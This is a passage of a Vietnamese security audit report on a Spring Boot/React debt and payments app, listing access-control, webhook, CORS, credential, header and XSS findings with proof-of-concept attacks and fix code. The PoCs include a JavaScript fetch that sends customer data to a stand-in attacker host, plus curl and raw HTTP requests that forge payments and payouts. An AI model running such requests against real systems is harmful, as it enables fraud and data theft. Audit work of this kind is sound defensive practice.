- **Định danh CWE / OWASP:** CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-862 (Missing Authorization), OWASP A01:2021 (Broken Access Control), OWASP API Security API1:2019.
- **Mức độ rủi ro:** **HIGH** (CVSS v3.1: 8.5 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/rest/TransactionController.java`: Dòng 38–43, 52–57
  - `Backend/src/main/java/com/cactus/practice/service/impl/TransactionServiceImpl.java`: Dòng 56–59, 107–129
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Endpoint `POST /api/transactions/{id}/refund` cho phép bất kỳ ai cung cấp mã `{id}` của giao dịch thực hiện hoàn tiền. Trong `TransactionServiceImpl.java`:
  ```java
  tx.setStatus("Refunded");
  // Tự động trừ tiền tổng chi tiêu của khách hàng
  Customer customer = customerRepository.findById(tx.getCustomerId()).orElse(null);
  if (customer != null) {
      double current = parseDouble(customer.getTotalSpent());
      customer.setTotalSpent(formatCurrency(Math.max(0, current - tx.getAmount())));
      customerRepository.save(customer);
  }
  ```
  Hành động này làm biến đổi trực tiếp số liệu chi tiêu của khách hàng và đảo ngược giao dịch tài chính mà không qua bước phê duyệt nào.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Kẻ tấn công dò quét các ID giao dịch dạng `tx_DEBT_2026_001` đến `tx_DEBT_2026_100` và gửi hàng loạt request `POST /api/transactions/{id}/refund`. Toàn bộ giao dịch của hệ thống bị chuyển thành `Refunded`, gây sai lệch nghiêm trọng trên sổ sách kế toán.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Bảo vệ endpoint hoàn tiền bằng `@PreAuthorize("hasRole('ADMIN')")`, đồng thời tích hợp quy trình phê duyệt kép và ghi log kiểm toán bắt buộc.

---

#### SEC-BOLA-04: BOLA / IDOR Trong Đơn Đặt Hàng Và Mở Khóa Hạn Mức Tín Dụng Trái Phép
- **Định danh CWE / OWASP:** CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-287 (Improper Authentication), OWASP A01:2021 (Broken Access Control).
- **Mức độ rủi ro:** **HIGH** (CVSS v3.1: 8.1 / AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/rest/O2CWorkflowController.java`: Dòng 36–40, 42–58
  - `Backend/src/main/java/com/cactus/practice/service/O2CWorkflowService.java`: Dòng 287–301
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Mọi đơn bán hàng (Sales Order) của tất cả khách hàng đều bị phơi bày qua `GET /api/o2c/orders`. Khi một đơn hàng bị hệ thống khóa tự động vì vượt hạn mức công nợ (`HARD_BLOCK`), endpoint `POST /api/o2c/orders/{id}/approve` cho phép mở khóa đơn hàng dựa trên `{id}` mà không kiểm tra phân quyền sở hữu hay tính hợp lệ của người phê duyệt.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Khách hàng bị khóa đơn hàng `SO-2026-081` do nợ xấu tự gửi request:
  `POST /api/o2c/orders/SO-2026-081/approve?approver=Self` kèm header `X-User-Role: ROLE_ADMIN` để tự gỡ khóa và ép kho hàng xuất kho giao hàng.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Yêu cầu quyền `ROLE_ADMIN` hoặc `ROLE_CREDIT_MANAGER` thực sự (qua Spring Security Authentication) mới được phép gọi hàm mở khóa.

---

#### SEC-BOLA-05: BOLA / IDOR Trong Quản Lý Tài Khoản Phòng Khám Đối Tác & Tài Khoản Ngân Hàng
- **Định danh CWE / OWASP:** CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-862 (Missing Authorization), OWASP A01:2021 (Broken Access Control).
- **Mức độ rủi ro:** **MEDIUM** (CVSS v3.1: 6.5 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/rest/ConnectedAccountController.java`: Dòng 36–62
  - `Backend/src/main/java/com/cactus/practice/service/impl/ConnectedAccountServiceImpl.java`: Dòng 39–42, 63–82
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Các phòng khám liên kết trong chuỗi Cactus Practice quản lý tài khoản nhận thanh toán ngân hàng (`ConnectedAccount`). Các API `GET /{id}`, `PUT /{id}`, `DELETE /{id}` không có kiểm tra xem người dùng thuộc phòng khám nào, cho phép phòng khám này sửa đổi số tài khoản ngân hàng thụ hưởng (`payoutBank`) của phòng khám khác.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Kẻ tấn công sửa đổi tài khoản ngân hàng của phòng khám đối tác `acc_02` thành số tài khoản cá nhân của kẻ tấn công thông qua `PUT /api/connected-accounts/acc_02`. Khi hệ thống chạy lệnh rút tiền tự động, toàn bộ doanh thu của đối tác sẽ chảy vào tài khoản kẻ tấn công.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Gắn mỗi `ConnectedAccount` với một `OrganizationId`/`TenantId` và bắt buộc kiểm tra sự trùng khớp với tài khoản đăng nhập trước khi cập nhật.

---

#### SEC-BOLA-06: BOLA / IDOR Trong Quy Trình Nhắc Nợ Tự Động (Dunning) Và Đóng Hồ Sơ Khiếu Nại (Dispute)
- **Định danh CWE / OWASP:** CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-862 (Missing Authorization), OWASP A01:2021 (Broken Access Control).
- **Mức độ rủi ro:** **MEDIUM** (CVSS v3.1: 6.1 / AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/rest/O2CWorkflowController.java`: Dòng 92–107, 122–139
  - `Backend/src/main/java/com/cactus/practice/service/O2CWorkflowService.java`: Dòng 322–331, 346–355
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Endpoint `POST /api/o2c/dunning/{id}/send` (phát hành thư đòi nợ/thư đe dọa pháp lý) và `POST /api/o2c/disputes/{id}/resolve` (đóng hồ sơ tranh chấp công nợ) nhận `{id}` tùy ý. Người dùng có thể kích hoạt gửi thư đòi nợ tới các khách hàng không liên quan hoặc tự ý đóng khiếu nại công nợ mà không có sự đồng ý của bộ phận pháp chế.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Một nhân viên gửi nhầm hàng loạt thông báo nhắc nợ gắt gao (Dunning Level 3) tới đối tác chiến lược cấp cao bằng cách gọi lặp `POST /api/o2c/dunning/{id}/send`, gây tổn hại nghiêm trọng đến quan hệ đối tác kinh doanh.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Phân quyền nghiêm ngặt theo danh mục tài khoản phụ trách của từng nhân viên quản lý nợ.

---

### MỤC TIÊU 5: LỘ LỌT DỮ LIỆU NHẠY CẢM & AN NINH API (SENSITIVE DATA & API SECURITY)

#### SEC-API-01: Điểm Cuối Webhook Thanh Toán Tài Khoản Ảo (VA) & VietQR Hoàn Toàn Thiếu Xác Thực Chữ Ký HMAC
- **Định danh CWE / OWASP:** CWE-306 (Missing Authentication for Critical Function), CWE-345 (Insufficient Verification of Data Authenticity), CWE-353 (Missing Support for Integrity Check), OWASP A07:2021 (Identification and Authentication Failures).
- **Mức độ rủi ro:** **CRITICAL** (CVSS v3.1: 9.8 / AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/rest/O2CWorkflowController.java`: Dòng 66–78
  - `Backend/src/main/java/com/cactus/practice/service/O2CWorkflowService.java`: Dòng 307–316
  - `Frontend/src/pages/HomePage.jsx`: Dòng 106–116
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Endpoint `POST /api/o2c/invoices/{id}/pay` đóng vai trò là webhook xử lý gạch nợ tự động (Bank Cash Application) khi tiền về tài khoản ảo VietQR:
  ```java
  // Backend/src/main/java/com/cactus/practice/rest/O2CWorkflowController.java:66-78
  @PostMapping("/invoices/{id}/pay")
  public ResponseEntity<ApiResponse<InvoiceDto>> payInvoice(
          @PathVariable String id,
          @RequestBody(required = false) Map<String, String> body
  ) {
      String amount = body != null ? body.getOrDefault("amount", "Full") : "Full";
      InvoiceDto updated = o2cService.payInvoice(id, amount);
      ...
  }
  ```
  Endpoint này mở công khai hoàn toàn (`permitAll`), không yêu cầu chữ ký HMAC-SHA256, không kiểm tra khóa bí mật webhook (`X-Webhook-Secret`), không xác thực địa chỉ IP nguồn của cổng thanh toán/ngân hàng và không đối chiếu số tiền thực tế nhận được với giá trị hóa đơn.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  1. Con nợ nhận hóa đơn `INV-2026-0091` số tiền 850,000,000 VND.
  2. Thay vì quét mã VietQR và chuyển tiền thật vào ngân hàng, con nợ gửi một HTTP request:
     ```bash
     curl -X POST http://localhost:8080/api/o2c/invoices/INV-2026-0091/pay \
          -H "Content-Type: application/json" \
          -d '{"amount":"1"}'
     ```
  3. Phương thức `o2cService.payInvoice` ngay lập tức gán `inv.setPaymentStatus("PAID")` và `inv.setRemainingAmount("0 ₫")`.
  4. Hệ thống tự động ngừng nhắc nợ và coi như khoản nợ 850 triệu đồng đã được thanh toán xong dù doanh nghiệp chưa nhận được một đồng nào.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  1. Xây dựng endpoint webhook chuyên biệt với đường dẫn bảo mật.
  2. Xác thực chữ ký HMAC-SHA256 tính trên toàn bộ payload bằng khóa bí mật chia sẻ với ngân hàng.
  3. Đối chiếu số tiền chuyển thực tế với số dư nợ của hóa đơn:
  ```java
  @PostMapping("/webhook/vietqr-callback")
  public ResponseEntity<ApiResponse<Void>> handleVietQrWebhook(
          @RequestHeader("X-Signature") String signature,
          @RequestBody VietQrCallbackPayload payload
  ) {
      if (!cryptoService.verifyHmacSha256(payload.getRawBody(), signature, webhookSecretKey)) {
          return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                  .body(ApiResponse.error("Chữ ký HMAC Webhook không hợp lệ!"));
      }
      o2cService.reconcileBankPayment(payload.getInvoiceId(), payload.getReceivedAmount(), payload.getBankTransactionRef());
      return ResponseEntity.ok(ApiResponse.ok("Gạch nợ thành công", null));
  }
  ```

---

#### SEC-API-02: Cấu Hình CORS Quá Mức Cho Phép Với Ký Tự Wildcard Kết Hợp `allowCredentials(true)`
- **Định danh CWE / OWASP:** CWE-942 (Permissive Cross-Origin Resource Sharing Policy with Credential), OWASP A05:2021 (Security Misconfiguration), OWASP A01:2021.
- **Mức độ rủi ro:** **HIGH** (CVSS v3.1: 7.5 / AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/config/WebMvcConfig.java`: Dòng 11–19
  - `Backend/src/main/java/com/cactus/practice/security/WebSecurityConfig.java`: Dòng 69–81
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Cả hai cấu hình `WebMvcConfig.java` và `WebSecurityConfig.java` đều kích hoạt:
  ```java
  configuration.setAllowedOriginPatterns(List.of("*"));
  configuration.setAllowCredentials(true);
  ```
  Trong cơ chế xử lý CORS của Spring Framework, việc kết hợp `allowedOriginPatterns("*")` với `allowCredentials(true)` sẽ khiến máy chủ phản hồi lại đúng giá trị header `Origin` của bất kỳ trang web nào gửi tới, kèm cờ `Access-Control-Allow-Credentials: true`. Điều này phá vỡ hoàn toàn chính sách Same-Origin Policy (SOP) của trình duyệt.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  1. Kế toán trưởng của DebtMaster đang đăng nhập hệ thống tại `http://internal-debt.company.com`.
  2. Kế toán truy cập một liên kết lừa đảo hoặc trang web độc hại `https://evil-phishing.com`.
  3. Trang web độc hại chạy ngầm đoạn mã JavaScript:
     ```javascript
     fetch('http://internal-debt.company.com/api/customers', { credentials: 'include' })
       .then(r => r.json())
       .then(data => fetch('https://attacker-server.com/steal', { method: 'POST', body: JSON.stringify(data) }));
     ```
  4. Trình duyệt gửi kèm thông tin phiên của kế toán. Máy chủ trả về dữ liệu và cho phép trang web độc hại đọc trộm toàn bộ danh sách khách hàng và số dư công nợ.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Chỉ cho phép danh sách trắng (whitelist) các domain tin cậy cụ thể được khai báo qua biến môi trường:
  ```java
  @Value("#{'${app.cors.allowed-origins:http://localhost:5173}'.split(',')}")
  private List<String> allowedOrigins;

  @Bean
  public CorsConfigurationSource corsConfigurationSource() {
      CorsConfiguration configuration = new CorsConfiguration();
      configuration.setAllowedOrigins(allowedOrigins); // Tuyệt đối không dùng allowedOriginPatterns("*")
      configuration.setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"));
      configuration.setAllowedHeaders(Arrays.asList("Authorization", "Content-Type", "Accept"));
      configuration.setAllowCredentials(true);
      UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
      source.registerCorsConfiguration("/**", configuration);
      return source;
  }
  ```

---

#### SEC-API-03: Các Điểm Cuối Thực Thi Tài Chính Quan Trọng Không Được Bảo Vệ (Giải Ngân Ngân Hàng, Hoàn Tiền, Quyết Toán)
- **Định danh CWE / OWASP:** CWE-862 (Missing Authorization), CWE-284 (Improper Access Control), OWASP A01:2021 (Broken Access Control).
- **Mức độ rủi ro:** **CRITICAL** (CVSS v3.1: 9.8 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/rest/PayoutController.java`: Dòng 45–49
  - `Backend/src/main/java/com/cactus/practice/rest/TransactionController.java`: Dòng 45–57
  - `Backend/src/main/java/com/cactus/practice/rest/O2CWorkflowController.java`: Dòng 66–78
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Các API gây dịch chuyển dòng tiền trực tiếp:
  - `POST /api/payouts`: Tạo lệnh chuyển tiền tức thì (Instant Payout) ra tài khoản ngân hàng bên ngoài. (Phía Frontend có điều kiện ẩn nút đối với non-admin, nhưng Backend hoàn toàn mở toang).
  - `POST /api/transactions`: Tạo giao dịch thu tiền / charge thẻ.
  - `POST /api/transactions/{id}/refund`: Hoàn tiền giao dịch.
  Không có phương thức nào trong số này được bảo vệ bởi `@PreAuthorize`. Kẻ tấn công có thể bỏ qua giao diện web và gọi trực tiếp API để rút sạch số dư thanh khoản của công ty.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Kẻ tấn công gửi HTTP POST request:
  ```http
  POST /api/payouts HTTP/1.1
  Host: localhost:8080
  Content-Type: application/json

  {
    "amount": 50000.00,
    "destination": "Tài khoản kẻ tấn công Techcombank 1903xxxxxxxx",
    "type": "Instant Payout"
  }
  ```
  Máy chủ trả về HTTP 200 OK với trạng thái giải ngân thành công.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Đặt `@PreAuthorize("hasRole('ADMIN')")` bắt buộc trên `PayoutController` và yêu cầu xác thực đa yếu tố (MFA OTP) đối với các lệnh chuyển tiền vượt hạn mức quy định.

---

#### SEC-API-04: Thiếu Kiểm Soát Idempotency Dẫn Đến Nguy Cơ Tấn Công Phát Lại (Replay Attack) Và Race Condition Khi Xử Lý Tiền
- **Định danh CWE / OWASP:** CWE-362 (Race Condition), CWE-294 (Authentication Bypass by Capture-replay), OWASP A04:2021 (Insecure Design).
- **Mức độ rủi ro:** **HIGH** (CVSS v3.1: 7.4 / AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/rest/O2CWorkflowController.java`: Dòng 66–78
  - `Backend/src/main/java/com/cactus/practice/service/O2CWorkflowService.java`: Dòng 13–18, 307–316, 361–370
  - `Backend/src/main/java/com/cactus/practice/service/impl/TransactionServiceImpl.java`: Dòng 62–104, 107–129
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Các API xử lý thanh toán, hoàn tiền và xóa nợ vặt (De Minimis Write-off) không yêu cầu header `Idempotency-Key` và không có cơ chế khóa phân tán hoặc khóa bi quan (Pessimistic Locking) trong CSDL. Hơn nữa, `O2CWorkflowService` sử dụng danh sách trong bộ nhớ `CopyOnWriteArrayList` không có tính toàn vẹn giao dịch ACID.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Kẻ tấn công gửi đồng thời 10 request song song trong cùng 1 mili-giây để yêu cầu hoàn tiền cho cùng một mã giao dịch `POST /api/transactions/tx_100/refund`. Do thiếu cơ chế khóa đồng thời, nhiều luồng cùng đọc trạng thái ban đầu và cùng trừ tiền nhiều lần, gây thất thoát kép cho doanh nghiệp.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Triển khai bộ lọc Idempotency lưu trữ `Idempotency-Key` trong Redis với TTL 24h và áp dụng khóa CSDL `@Lock(LockModeType.PESSIMISTIC_WRITE)` trên các bản ghi tài chính.

---

#### SEC-API-05: Ghi Thông Tin Mật Khẩu Quản Trị Dưới Dạng Cleartext Vào Log Khởi Động Ứng Dụng
- **Định danh CWE / OWASP:** CWE-532 (Insertion of Sensitive Information into Log File), OWASP A09:2021 (Security Logging and Monitoring Failures), OWASP A07:2021.
- **Mức độ rủi ro:** **HIGH** (CVSS v3.1: 7.5 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/config/DataInitializer.java`: Dòng 76, 83
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Trong quá trình khởi tạo dữ liệu mẫu, `DataInitializer.java` ghi nhật ký mật khẩu dạng rõ ràng ra log console:
  ```java
  // Backend/src/main/java/com/cactus/practice/config/DataInitializer.java:76, 83
  logger.info("Created default administrator: admin / 123456 (ROLE_ADMIN)");
  ...
  logger.info("Created default staff user: staff / 123456 (ROLE_STAFF)");
  ```
  Thông tin log này được lưu trữ trong stdout của container Docker, file log máy chủ hoặc chuyển tiếp tới các hệ thống giám sát tập trung (Elasticsearch, CloudWatch, Datadog), cho phép bất kỳ ai có quyền xem log đều chiếm được tài khoản quản trị.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Một lập trình viên cấp thấp hoặc nhân viên vận hành hệ thống truy cập vào giao diện xem log của máy chủ và thấy ngay mật khẩu `admin / 123456`, sau đó sử dụng mật khẩu này để đăng nhập vào môi trường production.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Xóa bỏ hoàn toàn việc in mật khẩu ra log. Chỉ ghi nhận việc khởi tạo thành công mà không kèm credential.

---

#### SEC-API-06: Rò Rỉ Cấu Trúc Bảng CSDL Nội Bộ Qua Thông Báo Lỗi Chưa Được Khử Trùng Trong Exception Handler
- **Định danh CWE / OWASP:** CWE-209 (Generation of Error Message Containing Sensitive Information), OWASP A05:2021 (Security Misconfiguration).
- **Mức độ rủi ro:** **MEDIUM** (CVSS v3.1: 5.3 / AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/exception/GlobalExceptionHandler.java`: Dòng 43–47
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Phương thức `handleGeneralException` trong `GlobalExceptionHandler.java` bắt tất cả các ngoại lệ chưa xử lý và trả thẳng `ex.getMessage()` về cho người dùng:
  ```java
  @ExceptionHandler(Exception.class)
  public ResponseEntity<ApiResponse<Void>> handleGeneralException(Exception ex) {
      return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
              .body(ApiResponse.error("An unexpected server error occurred: " + ex.getMessage()));
  }
  ```
  Khi xảy ra lỗi SQL hoặc lỗi ràng buộc dữ liệu, thông báo trả về sẽ chứa nguyên văn tên bảng CSDL, tên cột, câu truy vấn SQL bị lỗi và chi tiết driver CSDL. Đồng thời phương thức này không hề ghi log stack trace nội bộ, gây khó khăn cho việc điều tra sự cố.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Kẻ tấn công cố tình gửi dữ liệu sai định dạng để kích hoạt lỗi CSDL, sau đó đọc phản hồi JSON để vẽ lại sơ đồ cơ sở dữ liệu nội bộ (Database Schema Reconnaissance).
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Ghi log chi tiết stack trace nội bộ kèm mã tham chiếu sự cố (UUID), chỉ trả về thông báo lỗi chung cho Client:
  ```java
  @ExceptionHandler(Exception.class)
  public ResponseEntity<ApiResponse<Void>> handleGeneralException(Exception ex) {
      String incidentId = UUID.randomUUID().toString();
      logger.error("Internal Server Error [Incident ID: {}]", incidentId, ex);
      return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
              .body(ApiResponse.error("Đã xảy ra lỗi hệ thống nội bộ. Mã tham chiếu: " + incidentId));
  }
  ```

---

### MỤC TIÊU 6: CẤU HÌNH HỆ THỐNG, THƯ VIỆN PHỤ THUỘC & AN NINH FRONTEND (CONFIG, DEPENDENCIES & FRONTEND)

#### SEC-CFG-01: Mật Khẩu CSDL MySQL Dạng Rõ, Kết Nối CSDL Không Mã Hóa TLS Và JWT Secret Cố Định
- **Định danh CWE / OWASP:** CWE-798 (Use of Hard-coded Credentials), CWE-321 (Use of Hard-coded Cryptographic Key), OWASP A07:2021 & A05:2021.
- **Mức độ rủi ro:** **CRITICAL** (CVSS v3.1: 9.8 / AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/resources/application.properties`: Dòng 7–10, 24–26
  - `Backend/src/main/java/com/cactus/practice/security/jwt/JwtUtils.java`: Dòng 24–25
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Tệp cấu hình lưu trữ rõ ràng:
  - Mật khẩu CSDL: `spring.datasource.password=123456`
  - Chuỗi kết nối JDBC tắt hoàn toàn mã hóa TLS: `useSSL=false&allowPublicKeyRetrieval=true`
  - Khóa ký JWT đối xứng: `jwt.secret=cactusPracticeSuperSecretJwtKey2026...`
  Nếu mã nguồn được tải lên hệ thống quản lý phiên bản (GitHub, GitLab), toàn bộ dữ liệu CSDL và khả năng giả mạo phiên giao dịch sẽ bị lộ ra ngoài. Ngoài ra, việc truyền dữ liệu CSDL qua mạng không có TLS khiến lưu lượng truy vấn có thể bị nghe lén (Sniffing) trên mạng nội bộ.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Kẻ tấn công nằm cùng mạng nội bộ (hoặc cùng cụm cloud VPC) sử dụng Wireshark bắt gói tin TCP cổng 3306. Do `useSSL=false`, toàn bộ dữ liệu bảng khách hàng, số thẻ, giao dịch chuyển khoản đều hiển thị dưới dạng văn bản rõ.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Bật bắt buộc SSL cho MySQL (`useSSL=true&requireSSL=true`), chuyển toàn bộ credential sang biến môi trường:
  ```properties
  spring.datasource.url=${DB_URL:jdbc:mysql://localhost:3306/cactus_db?useSSL=true&requireSSL=true&serverTimezone=UTC}
  spring.datasource.username=${DB_USERNAME}
  spring.datasource.password=${DB_PASSWORD}
  jwt.secret=${JWT_SECRET}
  ```

---

#### SEC-CFG-02: Thiếu Mã Hóa Giao Vận HTTPS/TLS Và Hoàn Toàn Bỏ Quên Các Header Bảo Mật HTTP
- **Định danh CWE / OWASP:** CWE-319 (Cleartext Transmission of Sensitive Information), CWE-693 (Protection Mechanism Failure), CWE-1021 (Improper Restriction of Rendered UI Layers or Frames), OWASP A05:2021 (Security Misconfiguration).
- **Mức độ rủi ro:** **MEDIUM** (CVSS v3.1: 6.5 / AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/resources/application.properties`: Dòng 1–34
  - `Backend/src/main/java/com/cactus/practice/security/WebSecurityConfig.java`: Dòng 84–110
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Ứng dụng chạy thuần HTTP trên cổng 8080 mà không có cấu hình SSL/TLS (`server.ssl.*`). Trong `WebSecurityConfig.java`, cấu hình bảo mật hoàn toàn không thiết lập khối `http.headers(...)`. Trình duyệt khi nhận phản hồi từ DebtMaster không có các header bảo vệ chuẩn: Content-Security-Policy (CSP), Strict-Transport-Security (HSTS), X-Frame-Options, X-Content-Type-Options.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  1. Kẻ tấn công lồng trang quản trị DebtMaster vào một thẻ `<iframe>` trong suốt trên một trang web độc hại và thực hiện tấn công Clickjacking để dụ người dùng bấm vào nút "Refund" hoặc "Approve".
  2. Dữ liệu xác thực JWT được gửi qua kết nối HTTP không mã hóa tại mạng công cộng và bị trích xuất toàn bộ.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Cấu hình SSL và bổ sung đầy đủ security headers trong `SecurityFilterChain`:
  ```java
  http.headers(headers -> headers
      .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;"))
      .frameOptions(frame -> frame.deny())
      .contentTypeOptions(contentType -> {})
      .httpStrictTransportSecurity(hsts -> hsts.includeSubDomains(true).maxAgeInSeconds(31536000))
  );
  ```

---

#### SEC-CFG-03: Công Khai Tài Liệu Swagger OpenAPI Và Endpoint Quản Trị Actuator Cho Mọi Người
- **Định danh CWE / OWASP:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), OWASP A05:2021 (Security Misconfiguration).
- **Mức độ rủi ro:** **MEDIUM** (CVSS v3.1: 5.3 / AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/src/main/java/com/cactus/practice/security/WebSecurityConfig.java`: Dòng 97–104
  - `Backend/src/main/resources/application.properties`: Dòng 28–31
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Các đường dẫn `/v3/api-docs/**`, `/swagger-ui/**`, `/swagger-ui.html` và `/actuator/**` được cấu hình `permitAll()` trực tiếp trong `WebSecurityConfig.java`. Giao diện Swagger UI tương tác trực tiếp được phơi bày ra ngoài Internet mà không có bất kỳ hạn chế về môi trường hay xác thực.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Kẻ tấn công truy cập `http://target:8080/swagger-ui.html`, tải toàn bộ schema OpenAPI JSON, tự động phát hiện ra các tham số ẩn như `X-User-Role` và các endpoint thanh toán không được bảo vệ để tiến hành khai thác tự động.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Chỉ bật Swagger UI trên môi trường phát triển (Dev profile). Trên môi trường Production, bắt buộc yêu cầu quyền `ROLE_ADMIN` hoặc tắt hoàn toàn Swagger.

---

#### SEC-CFG-04: Thư Viện JJWT Đã Cũ (Deprecated) Và Thiếu Quy Trình Quét Lỗ Hổng Phụ Thuộc Tự Động
- **Định danh CWE / OWASP:** CWE-1395 (Dependency on Vulnerable Third-Party Component), OWASP A06:2021 (Vulnerable and Outdated Components).
- **Mức độ rủi ro:** **LOW** (CVSS v3.1: 3.7 / AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Backend/pom.xml`: Dòng 24–25, 64–81
  - `Frontend/package.json`: Dòng 11–24
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Dự án Backend đang sử dụng phiên bản JJWT `0.11.5` đã ngừng bảo trì chính thức và được khuyến cáo nâng cấp lên `0.12.x` để giải quyết các vấn đề liên quan đến API bảo mật khóa. Ngoài ra, trong quy trình build Maven và npm hoàn toàn chưa tích hợp plugin kiểm tra lỗ hổng phụ thuộc tự động.
- **Kịch bản tấn công lý thuyết (Attack Scenario / PoC):**
  Khi một lỗ hổng an ninh mới (CVE) được công bố trong các thư viện phụ thuộc của Spring Boot hoặc React/Vite, đội ngũ phát triển không nhận được cảnh báo tự động trong quy trình CI/CD.
- **Giải pháp khắc phục & Mã sửa mẫu (Remediation):**
  Nâng cấp lên `jjwt-api:0.12.6` và tích hợp `dependency-check-maven` vào `pom.xml`.

---

#### SEC-FE-01: DOM-Based Cross-Site Scripting (XSS) Do Nối Chuỗi `innerHTML` Không Được Khử Trùng Trong Frontend
- **Định danh CWE / OWASP:** CWE-79 (Improper Neutralization of Input During Web Page Generation - Cross-site Scripting), OWASP A03:2021 (Injection).
- **Mức độ rủi ro:** **HIGH** (CVSS v3.1: 8.0 / AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
- **Tệp và số dòng bị ảnh hưởng:**
  - `Frontend/app.js`: Dòng 333–343, 416–424, 443–451, 480–488, 530–538
- **Phân tích nguyên nhân gốc rễ (Root Cause Analysis):**
  Trong tệp mã nguồn xử lý DOM `Frontend/app.js`, các trường dữ liệu do người dùng nhập vào như mô tả thanh toán (`desc`), tên khách hàng (`customer`), tên phòng khám được nối trực tiếp vào chuỗi HTML template string và gán vào thuộc tính `newRow.innerHTML`:
  ```javascript
  // Frontend/app.js:333-343
  newRow.innerHTML = `
    <td class="py-3.5 px-4 font-semibold text-slate-900">$${amount} USD</td>
    <td class="py-3.5 px-4"><span ...>Succeeded ✓</span></td>
    <td class="py-3.5 px-4 text-slate-600">${desc}</td>
    <td class="py-3.5 px-4 font-medium text-indigo-600">${customer}</td>
    ...
  `;
  ```
